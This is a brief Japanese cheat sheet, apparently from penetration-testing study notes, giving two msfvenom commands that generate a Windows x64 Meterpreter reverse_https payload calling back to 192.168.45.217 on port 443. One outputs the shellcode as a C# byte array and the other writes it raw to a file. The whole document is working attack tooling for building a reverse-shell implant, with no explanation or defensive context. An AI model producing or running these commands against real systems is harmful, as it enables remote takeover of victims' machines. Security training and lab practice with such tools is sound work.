charpのバイト列を標準出力
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f csharp
```

shellcodeファイルを出力
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f raw -o test.dat
```